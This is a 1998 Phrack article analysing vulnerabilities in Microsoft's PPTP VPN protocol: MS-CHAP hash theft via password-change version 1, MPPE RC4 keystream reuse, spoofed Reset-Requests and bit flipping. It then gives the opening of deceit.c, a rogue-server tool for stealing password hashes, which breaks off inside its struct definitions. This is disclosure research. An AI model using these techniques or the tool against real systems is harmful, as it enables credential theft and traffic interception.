@@ -1,0 +1,1416 @@
+---[  Phrack Magazine   Volume 8, Issue 53 July 8, 1998, article 12 of 15
+
+
+-------------------------[  The Crumbling Tunnel
+
+
+--------[  aleph1 <aleph1@underground.org>
+
+ 
+                          -[ The Crumbling Tunnel ]-
+                    < A Menagerie of PPTP Vulnerabilities >
+
+                          by aleph1@underground.org
+
+
+    Point-to-Point Tunneling Protocol (PPTP) is a new networking
+    technology that allows you to use the Internet as your own secure
+    virtual private network (VPN).  PPTP is integrated with the Remote
+    Access Services (RAS) server which is built into Windows NT Server.
+    With PPTP, your users can dial into a local ISP, or connect directly
+    to the Internet, and access their network just as easily and securely
+    as if they were at their desks.
+
+    < http://www.microsoft.com/communications/pptp.htm >
+
+
+-[ p r e f a c e ]-
+
+This paper is a compendium of the discussions between myself and a Microsoft
+representative during October 1996 and May 1997 on several NT security
+mailing lists, the research done by Counterpane System and published in the
+ paper "Cryptanalysis of Microsoft's Point-to-Point Tunneling Protocol
+(PPTP)" by B. Schneier and P. Mudge on June 1998, and a new vulnerability I
+have recently discovered.
+
+
+-[ i n t r o d u c t i o n ]-
+
+As stated above, the Point-to-Point Tunneling Protocol is Microsoft's attempt
+at creating a Virtual Private Network (VPN) protocol.  Given their past
+history in developing and implementing protocols, an analysis of PPTP for
+security vulnerabilities would certainly be an interesting endeavor.  The
+following is such an analysis.
+
+Although this analysis is technical in nature, I will not spend the time
+describing exactly how each protocol works.  I will assume you have done your
+homework and at least briefly glanced over the specifications for each of
+the protocols involved.
+
+PPTP is really a number of protocols cobbled together to make a whole.  The
+players are:
+
+  GRE	    - The Generic Encapsulation Protocol. The protocol is
+              defined in RFC 1701 and RFC 1702.  Microsoft has defined
+              their own extensions. They call their modifications
+              GRE v2.
+
+  PPP	    - The Point-to-Point Protocol.  The protocol is defined 
+              in RFC 1661.  The protocol is used for the transmission
+              of multi-protocol datagrams over point-to-point links.
+
+  PPTP	    - PPTP uses GRE to tunnel PPP and adds a connections setup
+              and control protocol over a TCP session. 
+
+  MS-CHAP   - This is Microsoft's variant of the more common PPP CHAP
+              authentication protocol.  It is a challenge response
+              authentication algorithm.  It supplies the challenge used
+              by MPPE (see below) to encrypt the session.  It also has
+              two sub-protocols for changing passwords.  It is defined in the
+              draft draft-ietf-pppext-mschap-00.txt.
+
+  MPPE      - Microsoft's Point-to-Point Encryption protocol.  This is
+              the protocol in charge of generating a session key and
+              encrypting the session. It is defined in the drafts
+              draft-ietf-pppext-mppe-00.txt and  draft-ietf-pppext-mppe-01.txt.
+
+< PPTP in a nutshell >
+
+PPTP creates a connection setup and control channel using TCP to the PPTP
+server (Microsoft's RAS).  Using this connection, PPTP establishes a new GRE
+tunnel which will carry PPP packets from the client to the server.  The client
+will authenticate to the server via PPP's negotiation mechanism using MS-CHAP
+and will then encrypt all PPP data packets using MPPE.
+
+Enough acronyms for you?  Lets get dirty.
+
+
+-[ P P T P ]-
+
+PPTP creates a connection setup and control channel to the server using TCP.
+Originally the TCP port used was 5678.  Later on it was changed to 1723.  This
+is the IANA assigned port number.  The control connection is not authenticated
+in any way.  It is easy for Mallory (the malicious interloper) to take over
+the connection via TCP hijacking techniques.  She can then issue Stop Session
+Request commands.  This will close the control channel and at the same time all
+active calls (tunnels) will be cleared.
+
+
+-[ G R E ]-
+
+PPP packets are encapsulated in GRE and tunneled on top of IP.  GRE uses IP
+protocol number 47.  GRE packets are similar in some respects to TCP segments.
+They both may carry a sequence and acknowledgement number.  GRE also uses a
+sliding window to avoid congestion.
+
+This has some important implications.  It means that if we want to spoof PPP
+packets encapsulated in GRE, we will desynchronize the GRE channel.  A
+possible way around this is the use of the "S" flag in the GRE header.  This
+flag tells the end point if the GRE packet has a sequence number.  It is
+possible that a badly coded implementation will accept a GRE packet with data
+even if it does not have a sequence number.  This is because in the original
+GRE standard the use of sequence numbers was optional.  Furthermore, the
+specification does not mention how an end system should act if it receives a
+GRE packet with a duplicate sequence number.  It may simply discard it and
+send another acknowledgement.  This would mean we do not need to resynchronize
+GRE at all.  The other end will send an acknowledgement for the packet we
+spoofed and the encapsulated PPP should not become desynchronized.  As of this
+writing I haven't yet tested this possibility.
+
+It is also interesting to note that the original GRE specification has many
+options to do things like source routing which are left as implementation
+specific.  If you open a hole in your firewall for GRE just so you can use
+PPTP you might be letting in more than you think.  This area needs further
+investigation.
+
+
+-[ M S - C H A P ]-
+
+MS-CHAP is a challenge response protocol.  The server send the client an 8
+byte challenge.  The client computes a response by encrypting the challenge
+with the NT one way hash and then with the LANMAN one way hash.
+
+
+< Dictionary Attack >
+
+Like most other challenge/response protocols, this one is vulnerable to a
+dictionary by such tools as L0phtcrack.  As Schneier and Mudge describe in
+their paper, the LANMAN based response is easier to crack than it normally is
+because here it is divided into three pieces which are encrypted independently.
+This allows for a speed up in breaking the password.  Please see their paper
+for a detailed explanation of the process.
+
+The PPTP Performance update for Windows NT 4.0 (PPTP2-FIX) stops the PPTP
+Windows NT client from sending the LANMAN hash based response if the client
+is configured to use 128-bit encryption.  The same fix also allows the server
+to reject PPTP clients that attempt to authenticate using the LANMAN hash
+based response.
+
+
+< Stealing the Password >
+
+MS-CHAP has two sub-protocols for changing password.  In version one the
+client encrypts the new and old hashes (NT and LANMAN) with the challenge
+the server sent over the wire.  A passive attacker can simply decrypt the
+hashes and steal them.
+
+Version two encrypts the new hashes with the old hashes and encrypts the old
+hashes with the new hashes.  Only the server, which knows the old hashes,
+will be able to decrypt the new hashes and use these to decrypt the old
+hashes and verify the user's identity.
+
+As I recently discovered, this feature of MS-CHAP can be used to steal the
+user's password hashes if Mallory can masquerade as the PPTP server.  Several
+methods to masquerade as the server come into mind, including DNS hijacking
+and RIP spoofing.  Once the unsuspecting user connects to Mallory's rogue
+server and attempts to authenticate she will return a ERROR_PASSWD_EXPIRE
+error to the user and tell the client to use the older version of the
+password change sub-protocol.  The user will then be prompted by the PPTP
+client to enter his old and new password.  The client will proceed to send
+the new and old password hashes, LANMAN and NT, encrypted with the challenge
+the rouge server sent.  Now Mallory can use the hashes to logon into the real
+PPTP server and impersonate the user.
+
+The MS-CHAP draft deprecates the use of the change password version 1 protocol
+but Microsoft's implementation continue to support it.  This vulnerability was
+verified using Windows NT's RAS PPTP client with the PPTP Performance Update
+(PPTP2-FIX) installed.  At the end you will find some source code that
+implements a demonstration PPTP server that asks the user to change passwords
+using the older protocol and prints the stolen hashes on the screen.
+
+
+-[ M P P E ]-
+
+The are two drafts for MPPE. I'll discuss the earlier one first.
+
+MPPE uses RC4, a stream cipher, to encrypt the PPP datagrams.  MPPE is
+negotiated as a compression protocol as part of PPP's Link Control Protocol
+negotiation.
+
+
+< Session Keys >
+
+MPPE currently supports 40 and 128 bit session keys, although more key lengths
+can be defined.  The 40-bit session key is derived from the first 8 bytes of
+the LANMAN hash. The session key will be the same for all sessions until the
+user changes his password.
+
+The 128-bit session key is created by taking the first 16 bytes of the MD4
+hash and the first 16 bytes of the NT hash, and then hashing them with the
+servers challenge.  Microsoft claims that they hash the NT hash to protect it.
+I fail to see their point.  The password hash, nor it's hash, ever go over the
+wire.  Why they selected this algorithm remains a mystery.
+
+The new MPPE draft adds an option to use a 40-bit key derived from the NT hash.
+
+As Schneier and Mudge point out, it is misleading to say MPPE provides
+128-bit, or even 40-bit, security.  The 40-bit LANMAN based session key is
+derived from the password only, and as such will have a much lower entropy
+than a random 40-bit key.  The 128-bit and 40-bit NT hash based session keys
+are derived from both the users password and the server's challenge.
+Depending on how good the server's random number generator is, the session
+key may have a much lower entropy than 128 or 40 bits.  A study of how
+Microsoft's PPTP server, and NT in general, generates random numbers would
+be interesting.  The only way to guarantee the full strength of the key is by
+generating it with a good RNG.
+
+
+< Attacking PPP >
+
+As Schneier and Mudge also point, out only PPP packets with protocol numbers
+between 0x21 and 0xFA are encrypted (in essence only data packets are
+encrypted). In contrast, the PPP Encryption Control Protocol (RFC 1968)
+encrypts all packets other than LCP packets after ECP is negotiated.
+
+This means Mallory can spoof Network Control Protocol packets with impunity.
+It also means she can obtain some useful information by simply sniffing the
+NCP packets.  Things like whether the internal network uses IP, IPX, or
+NetBIOS, the internal IP address of the PPTP client, NetBIOS names, the IP
+address of internal WINS and DNS servers, the clients internal IPX node
+number and other things.  Read the IPCP (RFC 13320, NBFCP (RFC 2097) and
+IPXCP (RFC 1552) specifications for more information.
+
+
+< Breaking RC4 >
+
+Stream ciphers, like RC4, are susceptible to attack if two or more plaintexts
+are encrypted with the same key.  If you take two ciphertexts encrypted with
+the same key and xor them together you will obtain the two plaintexts xor'ed
+together.  If you can make an educated guess as to the structure and contents
+of part of one of the plaintexts you will be able to obtain the corresponding
+plaintext in the other message.
+
+MPPE is susceptible to such an attack.  As mentioned above the 40-bit session
+key is the same in each session.  Mallory can passively monitor the network
+and collect many sessions, all encrypted with the same key that she can then
+attempt to break.  The problem is compounded since she has learned things
+like the clients internal IP address and its NetBIOS name which will be in
+the encrypted packets by monitoring the NCP PPP packets.
+
+MPPE uses the same key in each direction.  For each session at least two
+packets, one inbound and one outbound, will be encrypted with the same key.
+In this way, even traffic protected by the 128-bit unique session key can be
+attacked.
+
+MPPE being a sub-protocol of PPP, a datagram protocol, does not expect a
+reliable link.  Instead it maintains a 12-bit coherency count that is
+increased for each packet to keep the encryption tables synchronized.  Each
+time the low order byte of the coherency count equals 0xFF (every 256 packets)
+the session key is regenerated based on the original session key and the
+current session key.
+
+If MPPE ever sees a packet with a coherency that it is not expecting it
+sends a CCP Reset-Request packet to the other end.  The other end, upon seeing
+this packet, will re-initialize the RC4 tables using the current session key.
+The next packet it sends will have the flushed bit set.  This bit will
+indicate to the other end that it should re-initialize its own tables.  In
+this way they become resynchronized.  This mode of operation is called
+"stateful mode" in the new MPPE draft.
+
+What does this all mean to us?  Well, it means we can force both ends of the
+connection to keep encrypting their packets with the same key until the low
+order sequence number reaches 0xFF.  For example assume Alice and Bob have
+just set up the communication channel.  They both have initialized their
+session keys and expect a packet with a coherency count of zero.
+
+Alice           ->      Bob
+
+Alice sends Bob a packet numbered zero encrypted with the cipher stream
+generated by the RC4 cipher and increments her sent coherency count to one.
+Bob receives the packet, decrypts it, and increments his receive coherency
+count to 1.
+
+Mallory (Bob)   ->      Alice
+
+Mallory sends Alice a spoofed (remember this is datagram protocol - assuming
+we don't desynchronize GRE) CCP Reset-Request packet.  Alice immediately
+re-initializes her RC4 tables to their original state.
+
+Alice           ->      Bob
+
+Alice sends another packet to Bob.  This packet will be encrypted with the
+same cipherstream as the last packet.  The packet will also have the FLUSHED
+bit set.  This will make Bob re-initialize its own RC4 tables.
+
+Mallory can continue to play this game up to a total of 256 times after
+which the session key will be changed.  By this point Mallory will have
+collected 256 packets from Alice to Bob all encrypted with the same cipher
+stream.
+
+Furthermore, since Alice and Bob start with the same session key in each
+direction Mallory can play the same game in the opposite direction collecting
+another 256 packets encrypted with the same cipher stream as the ones going
+from Alice to Bob.
+
+The Apr 1998 version of the draft adds a "stateless mode" option (otherwise
+known as "historyless mode" in some Microsoft literature) to the negotiation
+packets.  This option tells MPPE to change the session key after every packet
+and to ignore all this CCP Reset-Request and flushed bit business.  This
+option was introduced to improve PPTP's performance.  Although re-keying
+after each packet cuts the cipher performance by almost half, now PPTP no
+longer has to wait a whole round trip time to resynchronize.  This, in effect
+improves the performance of PPTP and at the same time made the attack I
+describe above useless.
+
+This new stateless mode was incorporated in the PPTP Performance Update for
+Windows NT 4.0 (PPTP2-FIX).
+
+
+< Bit Flipping >
+
+Schneier and Mudge describe a bit flipping attack in their paper.  Because of
+the properties of the RC4 cipher as used within MPPE an attacker can flip
+bits in the ciphertext that will be decrypted correctly by MPPE.  In this way
+an attacker can modify encrypted packets while they are in transit.
+
+
+-[ i m p l e m e n t a t i o n   b u g s ]-
+
+Schneier and Mudge describe a number of implementation bugs in Microsoft's
+PPTP control channel that crashed Windows NT with the Blue Screen of Death.
+Keving Wormington has found similar problem as posted some demonstration
+code to the BugTraq mailing list in Nov 1997.  Microsoft claims to have fixed
+this or similar problems in their PPTP-FIX hotfix.
+
+Schneier and Mudge also found that the Windows 95 client does not zero fill
+its buffers and leaks information in its protocol packets.
+
+A bug in the PPTP server allows clients to remain connected while packets
+are transmitted in the clear if the encryption negotiation between the
+client and server fails.  This problem is documented in Microsoft's Knowledge
+Base article Q177670.  They claim to have fixed it in the PPTP-FIX hotfix.
+
+-[ f i x i n g   t h i n g s ]-
+
+It is interesting to note that Microsoft has chosen to omit certain
+vulnerabilities from their response to the Counterpane paper.  Let's summarize
+them here so they don't get confused:
+
+---> The control connection is not authenticated.
+
+   Microsoft claims they will enhance the control channel in future updates
+   to authenticate each control packet.
+
+---> The MS-CHAP LANMAN hash response is vulnerable to a dictionary attack
+---| that can be speed up enormously.
+
+   The PPTP Performance Update for Windows NT 4.0 has added the option
+   to reject PPTP clients that attempt to use the LANMAN based response.
+   It also stops the Windows NT PPTP client from sending the LANMAN
+   based response when it is configured to require 128-bit encryption.
+   This is of little comfort to non-US customers that cannot use the
+   128-bit version of the software.  Microsoft claims to be testing
+   a Windows 95 client update, possibly DUN 1.3, that will stop clients
+   from sending the LANMAN response.  The only way for Microsoft to 
+   completely get rid of the 40-bit LANMAN hash based key and support
+   non-US customers is for them to implement the 40-bit NT hash based
+   session key introduced in the second MPPE draft.
+   
+---> The MS-CHAP NT hash response is vulnerable to a dictionary attack.
+
+   They must not use the password for authentication. Some sort of
+   public key protocol would fix the problem.
+
+---> A attacker can steal a users password hashes via the MS-CHAP password
+---| change protocol version one.
+
+   They update all the clients to stop responding to password change
+   requests using version one of the protocol.
+
+---> The 40-bit LANMAN hash based session key is the same across sessions.
+---> MPPE does not provide true 128-bit or 40-bit security.
+
+   Microsoft simply recommends that customers enforce a strong password 
+   policy. They should instead modify PPTP to generate truly random
+   keys. 
+
+---> MPPE does not encrypt Network Control Protocol PPP packets.
+
+   NCP packets should be encrypted.
+
+---> MPPE uses the same key in both directions.
+
+   Each direction must be started with a different key.
+
+---> MPPE is vulnerable to a Reset-Request attack.
+
+   Microsoft has fixed this problem in the latest PPTP draft by introducing
+   the stateless mode. The PPTP Performance Update for Windows NT 4.0 
+   implements this mode of operation. There is no solution for Windows 95 yet.
+   This means that if you have Windows 95 PPTP clients you are still vulnerable.
+
+---> MPPE is vulnerable to bit flipping attacks.
+
+   They must add a MAC to each packet or use a cipher other than RC4 that
+   does not exhibit this property.
+
+---> There are a number of denial of service and other vulnerabilities 
+---| caused by implementation errors.
+
+   Microsoft claims to have fixed some of this problems with 
+   PPTP-FIX and PPTP2-FIX.
+
+At least Microsoft should produce an Windows NT and Windows 95 PPTP update
+that does not use the same session keys in each direction, that does not
+support MS-CHAP password change protocol version one, does not send the send
+to LANMAN based response and supports the 40-bit NT hash based session key.
+
+
+-[ f u t u r e   d i r e c t i o n s ]-
+
+Microsoft's VPN strategy appears to be moving away from PPTP and going to
+Layer Two Tunneling Protocol (L2TP) and IPsec.  L2TP (currently an IETF
+draft) is a compromise between Cisco's Layer Two Forwarding (L2F), (a
+competing protocol) and PPTP.  This is certain to take a long time and they
+will probably support PPTP for backwards compatibility.
+
+L2TP is somewhat similar to PPTP.  L2TP uses UDP instead of GRE to tunnel the
+PPP packets.  Connection setup and control packets are carried within UDP.
+The protocol provides for the authentication of the control session via a
+shared secret and a challenge/response exchange.  It also provides the for
+the hiding of sensitive information, such as username and password, by
+encrypting it.
+
+Other than those simply security mechanism L2TP does not provide any
+security.  To operate L2TP in a secure manner you must use it with either
+IPsec to provide authentication and confidentiality of all IP packets, or by
+using PPP layer security.  If the former is chosen beware that the control
+packets can be spoofed after the authentication phase.
+
+If Microsoft decides to go with the later choice (possible because Windows
+98 will not have support for IPsec), they are well advised not to use MPPE
+and MS-CHAP as this would make L2TP almost as vulnerable as PPTP.  They would
+do better implementing ECP and some of the PPP Extensible Authentication
+Protocol (RFC 2284) options.
+
+For a discussion of L2TP security read the Security Considerations section
+of the L2TP draft.
+
+
+-[ m i s c e l l a n e o u s ]-
+
+The are a few interesting projects related to PPTP.
+
+-> Linux PPTP Masquerading
+< http://bmrc.berkeley.edu/people/chaffee/linux_pptp.html >
+
+Here you will find patches to the Linux kernel to support masquerading of
+PPTP connections.
+
+-> PPTP Client for Linux
+< http://www.pdos.lcs.mit.edu/~cananian/Projects/PPTP/ >
+
+Here you will find a free PPTP client implementation for Linux that should
+be easy to port to other platforms.
+
+
+-[ s u m m a r y ]-
+
+PPTP is a layer two tunneling protocol designed by Microsoft and some other
+vendors.  The protocol and in particular Microsoft's implementation have a
+number of vulnerabilities not completely fixed by the their latest software
+patches and draft revisions.
+
+PPTP will most likely stop most amateurs but by no means provides air tight
+security.  If you have some serious security needs we recommend you look at
+some other solution.
+
+The Layer Two Tunneling Protocol being defined within the IETF evolved from
+PPTP and Cisco's Layer Two Forwarding.  It has obviously benefited from the
+peer review it has had within the IETF as it looks like much better protocol
+than PPTP.  If combined with IPsec, L2TP looks like a promising solution.
+
+
+-[ r e f e r e n c e s ]-
+
+Cryptanalysis of Microsoft's Point-to-Point Tunneling Protocol (PPTP)
+by B. Schneier and P. Mudge
+< http://www.counterpane.com/pptp.html >
+
+Generic Routing Encapsulation (GRE) (RFC 1701)
+< ftp://ds.internic.net/rfc/rfc1701.txt >
+
+Generic Routing Encapsulation over IPv4 networks (RFC 1702)
+< ftp://ds.internic.net/rfc/rfc1702.txt >
+
+Layer Two Tunneling Protocol "L2TP" (May 1996)
+< http://www.ietf.org/internet-drafts/draft-ietf-pppext-l2tp-11.txt >
+
+Microsoft Point-To-Point Encryption (MPPE) Protocol (March 1998)
+< http://www.apocalypse.org/pub/internet-drafts/draft-ietf-pppext-mppe-00.txt >
+
+Microsoft Point-To-Point Encryption (MPPE) Protocol (April 1998)
+< http://www.ietf.org/internet-drafts/draft-ietf-pppext-mppe-01.txt >
+
+Microsoft PPP CHAP Extensions
+< http://www.ietf.org/internet-drafts/draft-ietf-pppext-mschap-00.txt >
+
+Point-to-Point Tunneling Protocol 
+< http://www.microsoft.com/communications/pptp.htm >
+
+Point-to-Point Tunneling Protocol (PPTP) Technical Specification (Feb, 22 1996)
+< http://hooah.com/workshop/prog/prog-gen/pptp.htm >
+
+Point-to-Point Tunneling Protocol--PPTP (Draft July 1997)
+< http://www.microsoft.com/communications/exes/draft-ietf-pppext-pptp-01.txt >
+
+PPTP and Implementation of Microsoft Virtual Private Networking
+< http://www.microsoft.com/communications/nrpptp.htm >
+
+PPTP Performance Update for Windows NT 4.0 Release Notes
+< http://support.microsoft.com/support/kb/articles/q167/0/40.asp >
+
+PPTP Security - An Update
+< http://www.microsoft.com/communications/pptpfinal.htm >
+
+RRAS Does Not Enforce String Encryption for DUN Clients
+< http://support.microsoft.com/support/kb/articles/q177/6/70.asp >
+
+STOP 0x0000000A in Raspptpe.sys on a Windows NT PPTP Server
+< http://support.microsoft.com/support/kb/articles/q179/1/07.asp >
+
+The Point-to-Point Protocol (PPP) (RFC 1661)
+< ftp://ftp.isi.edu/in-notes/rfc1661.txt >
+
+The PPP DES Encryption Protocol (DESE) (RFC 1969)
+< ftp://ftp.isi.edu/in-notes/rfc1969.txt >
+
+The PPP Encryption Control Protocol (ECP) (RFC 1968)
+< ftp://ftp.isi.edu/in-notes/rfc1968.txt >
+
+The PPP Internetwork Packet Exchange Control Protocol (IPXCP) 9rFC 1552)
+< ftp://ftp.isi.edu/in-notes/rfc1552.txt >
+
+The PPP NetBIOS Frames Control Protocol (NBFCP) (RFC 2097)
+< ftp://ftp.isi.edu/in-notes/rfc2097.txt >
+
+---------------------8<------------CUT-HERE----------->8---------------------
+
+<++> PPTP/deceit.c
+/*
+ * deceit.c by Aleph One
+ *
+ * This program implements enough of the PPTP protocol to steal the
+ * password hashes of users that connect to it by asking them to change
+ * their password via the MS-CHAP password change protocol version 1.
+ *
+ * The GRE code, PPTP structures and defines were shamelessly stolen from
+ * C. Scott Ananian's <cananian@alumni.princeton.edu> Linux PPTP client
+ * implementation.
+ *
+ * This code has been tested to work againts Windows NT 4.0 with the 
+ * PPTP Performance Update. If the user has selected to use the same
+ * username and password as the account they are currently logged in
+ * but enter a different old password when the PPTP client password
+ * change dialog box appears the client will send the hash for a null
+ * string for both the old LANMAN hash and old NT hash.
+ *
+ * You must link this program against libdes. Email messages asking how 
+ * to do so will go to /dev/null.
+ *
+ * Define BROKEN_RAW_CONNECT if your system does not know how to handle
+ * connect() on a raw socket. Normally if you use connect with a raw
+ * socket you should only get from the socket IP packets with the
+ * source address that you specified to connect(). Under HP-UX using
+ * connect makes read never to return. By not using connect we
+ * run the risk of confusing the GRE decapsulation process if we receive
+ * GRE packets from more than one source at the same time.
+ */
+
+#include <stdio.h>
+#include <sys/time.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <signal.h>
+#include <unistd.h>
+
+#include "des.h"
+
+#ifdef __hpux__
+#define u_int8_t uint8_t
+#define u_int16_t uint16_t
+#define u_int32_t uint32_t
+#endif
+
+/* define these as appropiate for your architecture */
+#define hton8(x)  (x)
+#define ntoh8(x)  (x)
+#define hton16(x) htons(x)
+#define ntoh16(x) ntohs(x)
+#define hton32(x) htonl(x)
+#define ntoh32(x) ntohl(x)
+
+#define PPTP_MAGIC 0x1A2B3C4D /* Magic cookie for PPTP datagrams */
+#define PPTP_PORT  1723       /* PPTP TCP port number            */
+#define PPTP_PROTO 47         /* PPTP IP protocol number         */
+
+#define PPTP_MESSAGE_CONTROL            1
+#define PPTP_MESSAGE_MANAGE             2
+
+#define PPTP_VERSION_STRING     "1.00"
+#define PPTP_VERSION            0x100
+#define PPTP_FIRMWARE_STRING    "0.01"
+#define PPTP_FIRMWARE_VERSION   0x001
+
+/* (Control Connection Management) */
+#define PPTP_START_CTRL_CONN_RQST       1
+#define PPTP_START_CTRL_CONN_RPLY       2
+#define PPTP_STOP_CTRL_CONN_RQST        3
+#define PPTP_STOP_CTRL_CONN_RPLY        4
+#define PPTP_ECHO_RQST                  5
+#define PPTP_ECHO_RPLY                  6
+
+/* (Call Management) */
+#define PPTP_OUT_CALL_RQST              7
+#define PPTP_OUT_CALL_RPLY              8
+#define PPTP_IN_CALL_RQST               9
+#define PPTP_IN_CALL_RPLY               10
+#define PPTP_IN_CALL_CONNECT            11
+#define PPTP_CALL_CLEAR_RQST            12
+#define PPTP_CALL_CLEAR_NTFY            13
+
+/* (Error Reporting) */
+#define PPTP_WAN_ERR_NTFY               14
+
+/* (PPP Session Control) */
+#define PPTP_SET_LINK_INFO              15
+
+/* (Framing capabilities for msg sender) */
+#define PPTP_FRAME_ASYNC        1
+#define PPTP_FRAME_SYNC         2
+#define PPTP_FRAME_ANY          3
+
+/* (Bearer capabilities for msg sender) */
+#define PPTP_BEARER_ANALOG      1
+#define PPTP_BEARER_DIGITAL     2
+#define PPTP_BEARER_ANY         3
+
+struct pptp_header {
+  u_int16_t length;       /* message length in octets, including header */
+  u_int16_t pptp_type;    /* PPTP message type. 1 for control message.  */
+  u_int32_t magic;        /* this should be PPTP_MAGIC.                 */
+  u_int16_t ctrl_type;    /* Control message type (0-15)                */
+  u_int16_t reserved0;    /* reserved.  MUST BE ZERO.                   */
+};
+
+struct pptp_start_ctrl_conn { /* for control message types 1 and 2 */
+  struct pptp_header header;
+
+  u_int16_t version;      /* PPTP protocol version.  = PPTP_VERSION     */
+  u_int8_t  result_code;  /* these two fields should be zero on rqst msg*/
+  u_int8_t  error_code;   /* 0 unless result_code==2 (General Error)    */
+  u_int32_t framing_cap;  /* Framing capabilities                       */
+  u_int32_t bearer_cap;   /* Bearer Capabilities                        */
+  u_int16_t max_channels; /* Maximum Channels (=0 for PNS, PAC ignores) */
+  u_int16_t firmware_rev; /* Firmware or Software Revision              */
+  u_int8_t  hostname[64]; /* Host Name (64 octets, zero terminated)     */
+  u_int8_t  vendor[64];   /* Vendor string (64 octets, zero term.)      */
+  /* MS says that end of hostname/vendor fields should be filled with   */
+  /* octets of value 0, but Win95 PPTP driver doesn't do this.          */
+};
+
+struct pptp_out_call_rqst { /* for control message type 7 */
+  struct pptp_header header;
+  u_int16_t call_id;      /* Call ID (unique id used to multiplex data)  */
+  u_int16_t call_sernum;  /* Call Serial Number (used for logging)       */
+  u_int32_t bps_min;      /* Minimum BPS (lowest acceptable line speed)  */
+  u_int32_t bps_max;      /* Maximum BPS (highest acceptable line speed) */
+  u_int32_t bearer;       /* Bearer type                                 */
+  u_int32_t framing;      /* Framing type                                */
+  u_int16_t recv_size;    /* Recv. Window Size (no. of buffered packets) */
+  u_int16_t delay;        /* Packet Processing Delay (in 1/10 sec)       */
+  u_int16_t phone_len;    /* Phone Number Length (num. of valid digits)  */
+  u_int16_t reserved1;    /* MUST BE ZERO                                */
+  u_int8_t  phone_num[64]; /* Phone Number (64 octets, null term.)       */
+  u_int8_t subaddress[64]; /* Subaddress (64 octets, null term.)         */
+};
+
+struct pptp_out_call_rply { /* for control message type 8 */
+  struct pptp_header header;
+  u_int16_t call_id;      /* Call ID (used to multiplex data over tunnel)*/
+  u_int16_t call_id_peer; /* Peer's Call ID (call_id of pptp_out_call_rqst)*/
+  u_int8_t  result_code;  /* Result Code (1 is no errors)                */
+  u_int8_t  error_code;   /* Error Code (=0 unless result_code==2)       */
+  u_int16_t cause_code;   /* Cause Code (addt'l failure information)     */
+  u_int32_t speed;        /* Connect Speed (in BPS)                      */
+  u_int16_t recv_size;    /* Recv. Window Size (no. of buffered packets) */
+  u_int16_t delay;        /* Packet Processing Delay (in 1/10 sec)       */
+  u_int32_t channel;      /* Physical Channel ID (for logging)           */
+};
+
+
+struct pptp_set_link_info {   /* for control message type 15 */
+  struct pptp_header header;
+  u_int16_t call_id_peer; /* Peer's Call ID (call_id of pptp_out_call_rqst) */
+  u_int16_t reserved1;    /* MUST BE ZERO                                   */
+  u_int32_t send_accm;    /* Send ACCM (for PPP packets; default 0xFFFFFFFF)*/
+  u_int32_t recv_accm;    /* Receive ACCM (for PPP pack.;default 0xFFFFFFFF)*/
+};
+
+#define PPTP_GRE_PROTO  0x880B
+#define PPTP_GRE_VER    0x1
+
+#define PPTP_GRE_FLAG_C 0x80
+#define PPTP_GRE_FLAG_R 0x40
+#define PPTP_GRE_FLAG_K 0x20
+#define PPTP_GRE_FLAG_S 0x10
+#define PPTP_GRE_FLAG_A 0x80
+
+#define PPTP_GRE_IS_C(f) ((f)&PPTP_GRE_FLAG_C)
+#define PPTP_GRE_IS_R(f) ((f)&PPTP_GRE_FLAG_R)
+#define PPTP_GRE_IS_K(f) ((f)&PPTP_GRE_FLAG_K)
+#define PPTP_GRE_IS_S(f) ((f)&PPTP_GRE_FLAG_S)
+#define PPTP_GRE_IS_A(f) ((f)&PPTP_GRE_FLAG_A)
+
+struct pptp_gre_header {
+  u_int8_t flags;               /* bitfield */
+  u_int8_t ver;                 /* should be PPTP_GRE_VER (enhanced GRE) */
+  u_int16_t protocol;           /* should be PPTP_GRE_PROTO (ppp-encaps) */
+  u_int16_t payload_len;        /* size of ppp payload, not inc. gre header */
+  u_int16_t call_id;            /* peer's call_id for this session */
+  u_int32_t seq;                /* sequence number.  Present if S==1 */
+  u_int32_t ack;                /* seq number of highest packet recieved by */
+                                /*  sender in this session */
+};
+
+#define PACKET_MAX 8196
+
+static u_int32_t ack_sent, ack_recv;
+static u_int32_t seq_sent, seq_recv;
+static u_int16_t pptp_gre_call_id;
+
+#define PPP_ADDRESS			0xFF
+#define PPP_CONTROL			0x03
+
+/* PPP Protocols */
+#define PPP_PROTO_LCP			0xc021
+#define PPP_PROTO_CHAP			0xc223
+
+/* LCP Codes */
+#define PPP_LCP_CODE_CONF_RQST		1
+#define PPP_LCP_CODE_CONF_ACK		2
+#define PPP_LCP_CODE_IDENT		12
+
+/* LCP Config Options */
+#define PPP_LCP_CONFIG_OPT_AUTH         3
+#define PPP_LCP_CONFIG_OPT_MAGIC	5
+#define PPP_LCP_CONFIG_OPT_PFC		7
+#define PPP_LCP_CONFIG_OPT_ACFC		8
+
+/* Auth Algorithms */
+#define PPP_LCP_AUTH_CHAP_ALGO_MSCHAP	0x80
+
+/* CHAP Codes */
+#define PPP_CHAP_CODE_CHALLENGE			1
+#define PPP_CHAP_CODE_RESPONCE			2
+#define PPP_CHAP_CODE_SUCESS			3
+#define PPP_CHAP_CODE_FAILURE			4
+#define PPP_CHAP_CODE_MSCHAP_PASSWORD_V1	5
+#define PPP_CHAP_CODE_MSCHAP_PASSWORD_V2	6
+
+#define PPP_CHAP_CHALLENGE_SIZE		8
+#define PPP_CHAP_RESPONCE_SIZE          49
+
+#define MSCHAP_ERROR    "E=648 R=0"
+
+struct ppp_header {
+    u_int8_t address;
+    u_int8_t control;
+    u_int16_t proto;
+};
+
+struct ppp_lcp_chap_header {
+  u_int8_t code;
+  u_int8_t ident;
+  u_int16_t length;
+};
+
+struct ppp_lcp_packet {
+  struct ppp_header ppp;
+  struct ppp_lcp_chap_header lcp;
+};
+
+struct ppp_lcp_chap_auth_option {
+  u_int8_t type;
+  u_int8_t length;
+  u_int16_t auth_proto;
+  u_int8_t algorithm;
+};
+
+struct ppp_lcp_magic_option {
+  u_int8_t type;
+  u_int8_t length;
+  u_int32_t magic;
+};
+
+struct ppp_lcp_pfc_option {
+  u_int8_t type;
+  u_int8_t length;
+};
+
+struct ppp_lcp_acfc_option {
+  u_int8_t type;
+  u_int8_t length;
+};
+  
+
+struct ppp_chap_challenge {
+  u_int8_t size;
+  union {
+    unsigned char challenge[8];
+    struct {
+      unsigned char lanman[24];
+      unsigned char nt[24];
+      u_int8_t flag;
+    } responce;
+  } value;
+  /* name */
+};
+
+struct ppp_mschap_change_password {
+  char old_lanman[16];
+  char new_lanman[16];
+  char old_nt[16];
+  char new_nt[16];
+  u_int16_t pass_length;
